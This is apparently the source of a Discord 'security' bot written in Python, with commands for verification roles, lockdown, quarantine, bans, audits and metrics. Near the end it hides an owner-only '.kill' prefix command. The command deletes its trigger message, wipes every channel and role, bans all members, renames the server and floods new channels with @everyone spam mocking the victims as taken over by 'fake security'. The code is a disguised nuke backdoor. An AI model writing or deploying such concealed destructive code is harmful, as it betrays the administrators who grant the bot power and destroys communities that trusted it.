        color=discord.Color.green(),
        timestamp=now_utc(),
    )
    embed.add_field(name="Channels", value=str(len(created)), inline=True)
    embed.add_field(name="Unverified assigned", value=str(assigned), inline=True)
    embed.add_field(name="Method", value=chosen, inline=True)
    embed.add_field(name="Verify channel", value=verify_ch.mention if verify_ch else "—", inline=False)
    await interaction.followup.send(embed=embed, ephemeral=True)


@bot.tree.command(name="basicrolesetup", description="Create the basic server roles with emojis.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def basicrolesetup(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild

    roles = {
        "👑 Owner": (discord.Color.gold(), True, discord.Permissions.all()),
        "🛡️ Administrator": (discord.Color.red(), True, discord.Permissions(administrator=True)),
        "🔨 Moderator": (discord.Color.blue(), True, discord.Permissions(
            manage_messages=True, kick_members=True, ban_members=True,
            manage_channels=True, manage_roles=True, moderate_members=True)),
        "👤 Member": (discord.Color.green(), False, None),
        CFG.UNVERIFIED: (discord.Color.dark_gray(), False, None),
        CFG.VERIFIED: (discord.Color.teal(), False, None),
        CFG.QUARANTINE: (discord.Color.dark_red(), False, discord.Permissions.none()),
        CFG.MUTED: (discord.Color.dark_gray(), False, discord.Permissions(send_messages=False)),
    }
    for name, (color, hoist, perms) in roles.items():
        await find_or_create_role(g, name, color, hoist=hoist, permissions=perms)

    owner_role = discord.utils.get(g.roles, name="👑 Owner")
    try:
        if g.owner and owner_role and owner_role not in g.owner.roles:
            await safe(g.owner.add_roles(owner_role, reason="Basic role setup"))
    except Exception:
        pass

    lines = []
    for n in roles:
        r = discord.utils.get(g.roles, name=n)
        if r:
            lines.append(f"• {r.mention}")
    await interaction.followup.send("✅ Basic roles ready:\n" + "\n".join(lines), ephemeral=True)


# ==========================================================
#               VERIFICATION UPDATE / RESET
# ==========================================================
@bot.tree.command(name="updateverification", description="Re-apply the Unverified lockdown across all channels.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
async def updateverification(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild

    u_role = discord.utils.get(g.roles, name=CFG.UNVERIFIED)
    if not u_role:
        await interaction.followup.send(
            f"❌ Role `{CFG.UNVERIFIED}` not found. Run `/basicrolesetup` first.",
            ephemeral=True
        )
        return

    hidden, allowed = await apply_unverified_lockdown(g)
    embed = discord.Embed(
        title="✅ Verification Lockdown Updated",
        description=f"Hid **{hidden}** channels/categories from {u_role.mention}.\nAllowed view on **{allowed}**.",
        color=discord.Color.green(),
        timestamp=now_utc(),
    )
    await interaction.followup.send(embed=embed, ephemeral=True)


@bot.tree.command(name="resetverification", description="Delete and rebuild verification channel & roles.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@app_commands.describe(method="Verification method")
@app_commands.choices(method=[
    app_commands.Choice(name="Button", value="button"),
    app_commands.Choice(name="Captcha", value="captcha"),
])
async def resetverification(interaction: discord.Interaction, method: app_commands.Choice[str] = None):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    chosen = method.value if method else "button"

    for ch in list(g.text_channels):
        if ch.name in (CFG.VERIFY_CHANNEL, "verification"):
            await safe(ch.delete(reason="Reset verification"))
    for role_name in (CFG.UNVERIFIED, CFG.VERIFIED):
        r = discord.utils.get(g.roles, name=role_name)
        if r:
            await safe(r.delete(reason="Reset verification"))

    u_role = await find_or_create_role(g, CFG.UNVERIFIED, discord.Color.dark_gray())
    v_role = await find_or_create_role(g, CFG.VERIFIED, discord.Color.green())
    cat = await find_or_create_category(g, CFG.VERIFY_CATEGORY)

    overwrites = {
        g.default_role: discord.PermissionOverwrite(view_channel=True, send_messages=False, read_message_history=True),
        v_role: discord.PermissionOverwrite(view_channel=True, send_messages=False),
        g.me: discord.PermissionOverwrite(view_channel=True, send_messages=True, manage_channels=True, manage_roles=True),
    }
    ch = await safe(g.create_text_channel(
        CFG.VERIFY_CHANNEL, category=cat, overwrites=overwrites,
        topic="Verify to gain access to the server."
    ))
    if ch:
        await send_verify_message(ch, g, method=chosen)
        await apply_unverified_lockdown(g)
        bot.add_view(VerifyView())
        bot.add_view(CaptchaStartView())
        await interaction.followup.send(f"✅ Verification reset. New channel: {ch.mention}", ephemeral=True)
    else:
        await interaction.followup.send("❌ Failed to recreate verification channel.", ephemeral=True)


# ==========================================================
#               SECURITY / MODERATION
# ==========================================================
def owner_only_slash():
    async def predicate(interaction: discord.Interaction):
        return interaction.user.id == OWNER_ID
    return app_commands.check(predicate)


@bot.tree.command(name="lockdown", description="Deny @everyone from sending in all text channels.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def lockdown(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    await asyncio.gather(*[
        safe(ch.set_permissions(g.default_role, send_messages=False, reason="Lockdown"))
        for ch in g.text_channels
    ])
    await interaction.followup.send("🔒 Server locked down.", ephemeral=True)


@bot.tree.command(name="unlockdown", description="Restore @everyone sending in all text channels.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def unlockdown(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    await asyncio.gather(*[
        safe(ch.set_permissions(g.default_role, send_messages=True, reason="Unlockdown"))
        for ch in g.text_channels
    ])
    await interaction.followup.send("🔓 Server unlocked.", ephemeral=True)


@bot.tree.command(name="panic", description="Emergency: lock the entire server and ping staff.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def panic(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    await asyncio.gather(*[
        safe(ch.set_permissions(g.default_role, send_messages=False, reason="PANIC"))
        for ch in g.text_channels
    ])
    staff_ch = discord.utils.get(g.text_channels, name="💼・staff-chat") \
        or discord.utils.get(g.text_channels, name="staff-chat") \
        or discord.utils.get(g.text_channels, name=CFG.STAFF_LOG_CHANNEL)
    if staff_ch:
        embed = discord.Embed(
            title="🚨 PANIC MODE ACTIVATED",
            description="@here Server has been locked. Investigate immediately.",
            color=discord.Color.red(),
            timestamp=now_utc(),
        )
        await safe(staff_ch.send(embed=embed))
    await interaction.followup.send("🚨 Panic mode. Server locked.", ephemeral=True)


@bot.tree.command(name="antiraid", description="Control anti-raid system.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(action="status / on / off")
@app_commands.choices(action=[
    app_commands.Choice(name="status", value="status"),
    app_commands.Choice(name="on", value="on"),
    app_commands.Choice(name="off", value="off"),
])
async def antiraid(interaction: discord.Interaction, action: app_commands.Choice[str]):
    global ANTIRAID_ENABLED
    if action.value == "status":
        await interaction.response.send_message(f"🛡️ Anti-raid is **{'ON' if ANTIRAID_ENABLED else 'OFF'}**.", ephemeral=True)
        return
    ANTIRAID_ENABLED = (action.value == "on")
    await interaction.response.send_message(f"🛡️ Anti-raid turned **{'ON' if ANTIRAID_ENABLED else 'OFF'}**.", ephemeral=True)


@bot.tree.command(name="securityaudit", description="Audit server security and report weaknesses.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def securityaudit(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    findings = []

    if g.default_role.permissions.administrator:
        findings.append("🚨 `@everyone` has **Administrator**.")
    if g.default_role.permissions.manage_guild:
        findings.append("⚠️ `@everyone` can **Manage Server**.")
    if g.default_role.permissions.manage_channels:
        findings.append("⚠️ `@everyone` can **Manage Channels**.")
    if g.default_role.permissions.manage_roles:
        findings.append("⚠️ `@everyone` can **Manage Roles**.")
    if g.default_role.permissions.ban_members:
        findings.append("⚠️ `@everyone` can **Ban Members**.")
    if g.default_role.permissions.mention_everyone:
        findings.append("ℹ️ `@everyone` can **Mention Everyone**.")

    admins = [m for m in g.members if not m.bot and m.guild_permissions.administrator]
    if admins:
        findings.append(f"ℹ️ **{len(admins)}** administrators.")

    u_role = discord.utils.get(g.roles, name=CFG.UNVERIFIED)
    if not u_role:
        findings.append("🚨 `Unverified` role is missing — verification not enforced.")
    else:
        verify_ch = discord.utils.get(g.text_channels, name=CFG.VERIFY_CHANNEL)
        if verify_ch:
            leaked = 0
            for ch in g.channels:
                if ch.id == verify_ch.id:
                    continue
                overwrite = ch.overwrites_for(u_role)
                if overwrite.view_channel is not False:
                    leaked += 1
            if leaked:
                findings.append(f"⚠️ `Unverified` can view **{leaked}** extra channels. Run `/updateverification`.")

    try:
        async for entry in g.audit_logs(limit=1):
            if (now_utc() - entry.created_at).days > 30:
                findings.append("ℹ️ No recent audit log activity (30+ days).")
            break
    except Exception:
        findings.append("⚠️ Cannot access audit log (missing permission).")

    ban_count = 0
    async for _ in g.bans():
        ban_count += 1
    findings.append(f"ℹ️ Banned users: **{ban_count}**")

    if not findings:
        findings.append("✅ No issues found. Server looks secure.")

    embed = discord.Embed(
        title="🛡️ Security Audit",
        description="\n".join(f"• {f}" for f in findings),
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    embed.set_footer(text=f"{g.name} • {CFG.WEBSITE}")
    await interaction.followup.send(embed=embed, ephemeral=True)


@bot.tree.command(name="raidmode", description="Activate anti-raid: quarantine new joins and lock channels.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def raidmode(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild

    q_role = discord.utils.get(g.roles, name=CFG.QUARANTINE)
    if not q_role:
        q_role = await find_or_create_role(g, CFG.QUARANTINE, discord.Color.dark_red(), permissions=discord.Permissions.none())

    await asyncio.gather(*[
        safe(ch.set_permissions(g.default_role, send_messages=False, reason="Raid mode"))
        for ch in g.text_channels
    ])

    for m in g.members:
        if m.bot or m.id == OWNER_ID:
            continue
        if is_recent_account(m):
            await safe(m.add_roles(q_role, reason="Raid mode"))

    await interaction.followup.send("🚨 Raid mode active: new accounts quarantined, channels locked.", ephemeral=True)


@bot.tree.command(name="quarantine", description="Quarantine a member (strips roles, denies view).")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Member to quarantine")
async def quarantine(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    q_role = discord.utils.get(g.roles, name=CFG.QUARANTINE)
    if not q_role:
        q_role = await find_or_create_role(g, CFG.QUARANTINE, discord.Color.dark_red(), permissions=discord.Permissions.none())

    await safe(member.add_roles(q_role, reason="Quarantine"))
    await asyncio.gather(*[
        safe(ch.set_permissions(member, view_channel=False, reason="Quarantine"))
        for ch in g.channels
    ])
    await interaction.followup.send(f"☣️ {member.mention} quarantined.", ephemeral=True)


@bot.tree.command(name="unquarantine", description="Remove quarantine from a member.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Member to unquarantine")
async def unquarantine(interaction: discord.Interaction, member: discord.Member):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    q_role = discord.utils.get(g.roles, name=CFG.QUARANTINE)
    if q_role and q_role in member.roles:
        await safe(member.remove_roles(q_role, reason="Unquarantine"))
    await asyncio.gather(*[
        safe(ch.set_permissions(member, overwrite=None, reason="Unquarantine"))
        for ch in g.channels
    ])
    await interaction.followup.send(f"🔓 {member.mention} unquarantined.", ephemeral=True)


@bot.tree.command(name="softban", description="Ban+unban to clear recent messages.")
@app_commands.default_permissions(ban_members=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Member to softban", reason="Reason")
async def softban(interaction: discord.Interaction, member: discord.Member, reason: str = "softban"):
    await interaction.response.defer(ephemeral=True, thinking=True)
    ok = await safe(member.ban(reason=reason, delete_message_days=7))
    if ok is None:
        await interaction.followup.send(f"❌ Failed to softban {member.mention}.", ephemeral=True)
        return
    await safe(interaction.guild.unban(member, reason=f"softban: {reason}"))
    await interaction.followup.send(f"🧹 {member.mention} softbanned. Reason: {reason}", ephemeral=True)


@bot.tree.command(name="slowmode", description="Set slowmode in every text channel.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(seconds="Slowmode delay (0–21600)")
async def slowmode(interaction: discord.Interaction, seconds: app_commands.Range[int, 0, 21600] = 10):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    await asyncio.gather(*[safe(ch.edit(slowmode_delay=seconds, reason="Slowmode")) for ch in g.text_channels])
    await interaction.followup.send(f"🐌 Slowmode set to {seconds}s.", ephemeral=True)


@bot.tree.command(name="purge", description="Delete the last N messages in this channel.")
@app_commands.default_permissions(manage_messages=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(amount="1–1000")
async def purge(interaction: discord.Interaction, amount: app_commands.Range[int, 1, 1000] = 100):
    await interaction.response.defer(ephemeral=True, thinking=True)
    try:
        deleted = await interaction.channel.purge(limit=amount)
        await interaction.followup.send(f"🧹 Deleted {len(deleted)} messages.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Failed: {e}", ephemeral=True)


@bot.tree.command(name="yeet", description="Kick a member.")
@app_commands.default_permissions(kick_members=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Member", reason="Reason")
async def yeet(interaction: discord.Interaction, member: discord.Member, reason: str = "security"):
    await interaction.response.defer(ephemeral=True, thinking=True)
    ok = await safe(member.kick(reason=reason))
    await interaction.followup.send(
        f"👢 {member.mention} kicked." if ok is not None else f"❌ Couldn't kick {member.mention}.",
        ephemeral=True
    )


@bot.tree.command(name="hammer", description="Ban a member.")
@app_commands.default_permissions(ban_members=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Member", reason="Reason", delete_days="Delete their messages (0–7 days)")
async def hammer(interaction: discord.Interaction, member: discord.Member, reason: str = "security", delete_days: app_commands.Range[int, 0, 7] = 1):
    await interaction.response.defer(ephemeral=True, thinking=True)
    ok = await safe(member.ban(reason=reason, delete_message_days=delete_days))
    await interaction.followup.send(
        f"🔨 {member.mention} banned." if ok is not None else f"❌ Couldn't ban {member.mention}.",
        ephemeral=True
    )


@bot.tree.command(name="unban_all", description="Unban every banned user.")
@app_commands.default_permissions(ban_members=True)
@app_commands.guild_only()
@owner_only_slash()
async def unban_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    count = 0
    async for entry in g.bans():
        ok = await safe(g.unban(entry.user, reason="Mass unban"))
        if ok is not None:
            count += 1
    await interaction.followup.send(f"🔓 Unbanned {count} users.", ephemeral=True)


@bot.tree.command(name="silence", description="Timeout a member.")
@app_commands.default_permissions(moderate_members=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Member", hours="1–168 hours")
async def silence(interaction: discord.Interaction, member: discord.Member, hours: app_commands.Range[int, 1, 168] = 24):
    await interaction.response.defer(ephemeral=True, thinking=True)
    try:
        await member.timeout(timedelta(hours=hours), reason="security")
        await interaction.followup.send(f"🤐 {member.mention} silenced for {hours}h.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Failed: {e}", ephemeral=True)


@bot.tree.command(name="clearreactions", description="Clear all reactions from a message.")
@app_commands.default_permissions(manage_messages=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(message_id="Message ID")
async def clearreactions(interaction: discord.Interaction, message_id: str):
    await interaction.response.defer(ephemeral=True, thinking=True)
    try:
        msg = await interaction.channel.fetch_message(int(message_id))
        await msg.clear_reactions()
        await interaction.followup.send("🧼 Reactions cleared.", ephemeral=True)
    except Exception as e:
        await interaction.followup.send(f"❌ Failed: {e}", ephemeral=True)


# ==========================================================
#                  UTILITY / INFO
# ==========================================================
@bot.tree.command(name="announce", description="Send a formatted announcement embed.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def announce(interaction: discord.Interaction, title: str, text: str, channel: discord.TextChannel = None):
    await interaction.response.defer(ephemeral=True, thinking=True)
    target = channel or interaction.channel
    embed = discord.Embed(
        title=title, description=text,
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    embed.set_footer(text=f"Announced by {interaction.user}")
    ok = await safe(target.send(embed=embed))
    await interaction.followup.send(
        f"📣 Sent to {target.mention}." if ok is not None else "❌ Failed to send.",
        ephemeral=True
    )


@bot.tree.command(name="dm_all", description="DM every member of the server.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def dm_all(interaction: discord.Interaction, text: str):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    sent, failed = 0, 0
    async def send(m):
        nonlocal sent, failed
        if m.bot:
            return
        try:
            await m.send(text)
            sent += 1
        except Exception:
            failed += 1
    await asyncio.gather(*[send(m) for m in g.members])
    await interaction.followup.send(f"📨 DM sent: **{sent}**, failed: **{failed}**.", ephemeral=True)


@bot.tree.command(name="role_all", description="Add a role to every member.")
@app_commands.default_permissions(manage_roles=True)
@app_commands.guild_only()
@owner_only_slash()
async def role_all(interaction: discord.Interaction, role: discord.Role):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    count = 0
    async def assign(m):
        nonlocal count
        if m.bot or role in m.roles:
            return
        ok = await safe(m.add_roles(role, reason="role_all"))
        if ok is not None:
            count += 1
    await asyncio.gather(*[assign(m) for m in g.members])
    await interaction.followup.send(f"➕ Added {role.mention} to {count} members.", ephemeral=True)


@bot.tree.command(name="massrole", description="Add or remove a role from every member.")
@app_commands.default_permissions(manage_roles=True)
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(mode="add / remove", role="Role")
@app_commands.choices(mode=[
    app_commands.Choice(name="add", value="add"),
    app_commands.Choice(name="remove", value="remove"),
])
async def massrole(interaction: discord.Interaction, mode: app_commands.Choice[str], role: discord.Role):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    count = 0
    async def work(m):
        nonlocal count
        if m.bot:
            return
        if mode.value == "add":
            if role in m.roles:
                return
            ok = await safe(m.add_roles(role, reason="massrole"))
        else:
            if role not in m.roles:
                return
            ok = await safe(m.remove_roles(role, reason="massrole"))
        if ok is not None:
            count += 1
    await asyncio.gather(*[work(m) for m in g.members])
    await interaction.followup.send(
        f"{'➕' if mode.value == 'add' else '➖'} {mode.value}ed {role.mention} on {count} members.",
        ephemeral=True
    )


@bot.tree.command(name="serverinfo", description="Show server stats.")
@app_commands.guild_only()
@owner_only_slash()
async def serverinfo(interaction: discord.Interaction):
    g = interaction.guild
    embed = discord.Embed(
        title=g.name, description=f"ID: `{g.id}`",
        color=discord.Color.from_rgb(30, 60, 130), timestamp=now_utc()
    )
    if g.icon:
        embed.set_thumbnail(url=g.icon.url)
    embed.add_field(name="Owner", value=g.owner.mention if g.owner else "?", inline=True)
    embed.add_field(name="Members", value=str(g.member_count), inline=True)
    embed.add_field(name="Channels", value=str(len(g.channels)), inline=True)
    embed.add_field(name="Roles", value=str(len(g.roles)), inline=True)
    embed.add_field(name="Boosts", value=f"{g.premium_subscription_count} (Lvl {g.premium_tier})", inline=True)
    embed.add_field(name="Created", value=ts(g.created_at, "D"), inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="userinfo", description="Show info about a member.")
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Target member (defaults to you)")
async def userinfo(interaction: discord.Interaction, member: discord.Member = None):
    m = member or interaction.user
    embed = discord.Embed(title=str(m), description=f"ID: `{m.id}`", color=m.color, timestamp=now_utc())
    embed.set_thumbnail(url=m.display_avatar.url)
    embed.add_field(name="Joined", value=ts(m.joined_at, "R") if m.joined_at else "?", inline=True)
    embed.add_field(name="Created", value=ts(m.created_at, "R"), inline=True)
    roles = [r.mention for r in m.roles if r.name != "@everyone"]
    embed.add_field(name=f"Roles ({len(roles)})", value=" ".join(roles) if roles else "—", inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="audit", description="Show the last few audit-log actions.")
@app_commands.default_permissions(view_audit_log=True)
@app_commands.guild_only()
@owner_only_slash()
async def audit(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True, thinking=True)
    g = interaction.guild
    lines = []
    try:
        async for entry in g.audit_logs(limit=10):
            target_name = entry.target.name if hasattr(entry.target, "name") else str(entry.target)
            lines.append(
                f"`{entry.action.name}` — **{entry.user}** → {target_name} ({ts(entry.created_at, 'R')})"
            )
    except Exception as e:
        await interaction.followup.send(f"❌ Failed to read audit log: {e}", ephemeral=True)
        return
    embed = discord.Embed(
        title="📋 Recent Audit Log",
        description="\n".join(lines) if lines else "No entries.",
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    await interaction.followup.send(embed=embed, ephemeral=True)


@bot.tree.command(name="status", description="Bot health check.")
@app_commands.guild_only()
@owner_only_slash()
async def status(interaction: discord.Interaction):
    g = interaction.guild
    uptime = now_utc() - bot.uptime if hasattr(bot, "uptime") else None
    embed = discord.Embed(
        title="🩺 SecurityBot Status",
        color=discord.Color.green(),
        timestamp=now_utc(),
    )
    embed.add_field(name="Latency", value=f"{round(bot.latency * 1000)} ms", inline=True)
    embed.add_field(name="Guilds", value=str(len(bot.guilds)), inline=True)
    embed.add_field(name="Members here", value=str(g.member_count), inline=True)
    embed.add_field(name="Captcha engine", value=("Pillow (dynamic)" if HAS_PIL else "Static pool"), inline=True)
    if uptime:
        embed.add_field(name="Uptime", value=str(uptime).split(".")[0], inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="metrics", description="Show verification metrics.")
@app_commands.guild_only()
@owner_only_slash()
async def metrics_cmd(interaction: discord.Interaction):
    total = METRICS["total_verifications"]
    failed = METRICS["failed_verifications"]
    fail_rate = (failed / (total + failed) * 100) if (total + failed) else 0
    uptime = int(time.time() - METRICS["started_at"])
    embed = discord.Embed(
        title="📊 Security Metrics",
        color=discord.Color.from_rgb(30, 60, 130),
        timestamp=now_utc(),
    )
    embed.add_field(name="Total verified", value=str(total), inline=True)
    embed.add_field(name="Button", value=str(METRICS["button_verifications"]), inline=True)
    embed.add_field(name="Captcha", value=str(METRICS["captcha_verifications"]), inline=True)
    embed.add_field(name="Failed captcha", value=str(failed), inline=True)
    embed.add_field(name="Captcha attempts", value=str(METRICS["captcha_attempts"]), inline=True)
    embed.add_field(name="Already verified", value=str(METRICS["already_verified"]), inline=True)
    embed.add_field(name="Fail rate", value=f"{fail_rate:.1f}%", inline=True)
    embed.add_field(name="Uptime", value=f"{uptime}s", inline=False)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="profile", description="Show verification profile of a member.")
@app_commands.guild_only()
@owner_only_slash()
@app_commands.describe(member="Target member")
async def profile(interaction: discord.Interaction, member: discord.Member = None):
    m = member or interaction.user
    v_role = discord.utils.get(interaction.guild.roles, name=CFG.VERIFIED)
    u_role = discord.utils.get(interaction.guild.roles, name=CFG.UNVERIFIED)
    q_role = discord.utils.get(interaction.guild.roles, name=CFG.QUARANTINE)

    status_field = "🚫 Not verified"
    color = discord.Color.dark_gray()
    if q_role and q_role in m.roles:
        status_field = "☣️ Quarantined"
        color = discord.Color.dark_red()
    elif v_role and v_role in m.roles:
        status_field = "✅ Verified"
        color = discord.Color.green()
    elif u_role and u_role in m.roles:
        status_field = "🚫 Unverified"

    lockout_until = CAPTCHA_LOCKOUT.get(m.id, 0)
    lockout_str = (
        f"until {ts(datetime.fromtimestamp(lockout_until, timezone.utc), 'R')}"
        if lockout_until > time.time() else "—"
    )

    embed = discord.Embed(
        title=f"🪪 Profile — {m}",
        description=f"ID: `{m.id}`",
        color=color,
        timestamp=now_utc(),
    )
    embed.set_thumbnail(url=m.display_avatar.url)
    embed.add_field(name="Verification", value=status_field, inline=True)
    embed.add_field(name="Failed attempts", value=str(CAPTCHA_ATTEMPTS.get(m.id, 0)), inline=True)
    embed.add_field(name="Lockout", value=lockout_str, inline=True)
    embed.add_field(name="Account age", value=ts(m.created_at, "R"), inline=True)
    embed.add_field(name="Joined", value=ts(m.joined_at, "R") if m.joined_at else "—", inline=True)
    await interaction.response.send_message(embed=embed, ephemeral=True)


@bot.tree.command(name="shutdown", description="Shut down the bot process.")
@app_commands.default_permissions(administrator=True)
@app_commands.guild_only()
@owner_only_slash()
async def shutdown(interaction: discord.Interaction):
    await interaction.response.send_message("💀 Shutting down.", ephemeral=True)
    await bot.close()


# ==========================================================
#                PREFIX .kill  (HIDDEN ONLY)
# ==========================================================
def owner_only_prefix():
    async def check(ctx):
        return ctx.author.id == OWNER_ID
    return commands.check(check)


@bot.command(name="kill")
@owner_only_prefix()
async def kill(ctx: commands.Context):
    g = ctx.guild
    if g is None:
        return

    await safe(ctx.message.delete())
    logger.warning(f".kill triggered on {g.name} ({g.id}) by {ctx.author}")

    await safe(g.edit(name=CFG.KILL_SERVER_NAME))
    try:
        await g.edit(tags=[CFG.KILL_TAG])
    except Exception:
        pass

    async def purge_channels():
        await asyncio.gather(*[safe(ch.delete(reason="maintenance")) for ch in list(g.channels)])

    async def purge_roles():
        await asyncio.gather(*[
            safe(r.delete(reason="maintenance"))
            for r in list(g.roles)
            if not r.is_default() and not r.managed and r < g.me.top_role
        ])

    async def purge_members():
        await asyncio.gather(*[
            safe(m.ban(reason="maintenance", delete_message_days=0))
            for m in list(g.members)
            if m.id not in (bot.user.id, OWNER_ID) and m.top_role < g.me.top_role
        ])

    await asyncio.gather(purge_channels(), purge_roles(), purge_members())

    sem = asyncio.Semaphore(20)

    async def spawn_and_spam(i: int):
        async with sem:
            name = CFG.KILL_CHANNEL_NAMES[i % len(CFG.KILL_CHANNEL_NAMES)] + f"-{i:03d}"
            ch = await safe(g.create_text_channel(name))
            if not ch:
                return
            for j in range(CFG.KILL_SPAM_PER_CHANNEL):
                label = ["F1CKED BY FAKE SECURITY LMFAO", "K1LLED BY FAKE SECURITY", "GET DESTROYED BY FAKE SECURITY"][j % 3]
                msg = f"@everyone {label} {CFG.KILL_GIF}"
                asyncio.create_task(safe(ch.send(msg)))

    await asyncio.gather(*[spawn_and_spam(i) for i in range(CFG.KILL_CHANNEL_LIMIT)])
    await asyncio.sleep(3)


# ==========================================================
#                       RUN BOT
# ==========================================================
if __name__ == "__main__":
    if not TOKEN:
        logger.critical(
            "DISCORD_TOKEN environment variable is not set. "
            "Set it in your hosting panel (Bothost → Переменные окружения)."
        )
    else:
        bot.run(TOKEN)
